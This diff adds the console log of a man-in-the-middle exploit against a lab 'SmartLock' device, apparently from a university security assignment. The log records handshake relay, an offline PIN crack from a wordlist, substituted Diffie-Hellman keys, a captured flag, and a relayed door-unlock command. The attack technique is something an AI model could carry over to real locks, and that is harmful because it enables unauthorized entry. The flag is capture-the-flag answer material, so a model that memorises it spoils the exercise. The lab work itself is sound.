@@ -1,0 +1,43 @@
+====================================================
+[*] SmartLock v1 MITM Impersonation Exploit (TASKA2)
+[*] Target Lock Server : 10.10.10.11:9030
+[*] Relay Listening on : 0.0.0.0:8000
+[*] PIN Wordlist       : /mnt/c/Users/fahad/Desktop/Projects/Info Sec A2/lab/smartlock/pin_wordlist.txt
+====================================================
+[+] Waiting for Hub connection...
+[+] Hub connected. Opening session to the Lock...
+[+] Connected to Lock. Starting handshake relay.
+[-] Hub HELLO   : suites:AES256-GCM,AES128-GCM,NULL	type:HELLO
+[-] Lock SUITE  : AES256-GCM
+[-] Lock CERT   : name=smartlock-23i-0614.local (forwarded; hub does not validate it)
+[PINHASH] 8ce6450b7ffe96f90a954d690c4fc17f
+[*] Recovering pairing PIN offline...
+[+] PIN cracked: summer283 (75284 candidates, 25 ms)
+[-] Lock DH     : p=1036603071667 g=2 B=561189784987 (unsigned; intercepted)
+[+] Two independent session keys derived:
+    K_lock = session_key(B_lock^a_proxy mod p)
+    K_hub  = session_key(A_hub^b_proxy mod p)
+
+[LOCK->HUB] Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+[+] FLAG RECOVERED: FLAG{c3603ab534897940}
+[HUB->LOCK] STATUS
+[LOCK->HUB] STATE LOCKED unlocks=0
+[HUB->LOCK] UNLOCK
+[LOCK->HUB] DOOR OPENED (unlock #1)
+[HUB->LOCK] LOCK
+[LOCK->HUB] DOOR LOCKED
+[HUB->LOCK] QUIT
+
+====================================================
+[+] MITM session complete.
+    Cracked PIN : summer283
+    Pairing FLAG: FLAG{c3603ab534897940}
+====================================================
+
+============ HUB CLIENT OUTPUT (through MITM relay) ============
+[hub] negotiated suite: AES256-GCM
+[hub] device claims to be: smartlock-23i-0614.local (certificate not checked)
+[lock] Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+[lock] STATE LOCKED unlocks=0
+[lock] DOOR OPENED (unlock #1)
+[lock] DOOR LOCKED
